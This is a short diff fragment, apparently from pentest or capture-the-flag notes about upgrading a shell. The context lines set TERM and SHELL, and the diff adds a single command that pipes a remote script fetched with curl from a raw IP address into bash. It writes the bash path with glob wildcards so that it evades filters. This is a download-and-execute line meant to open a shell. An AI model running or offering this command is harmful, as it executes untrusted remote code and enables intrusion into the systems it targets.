@@ -24,3 +24,5 @@
 		export TERM=xterm 
 		export SHELL=bash
 ```
+
+curl 01.8.203.6:8000/shellencod.php | /b?n/ba?h
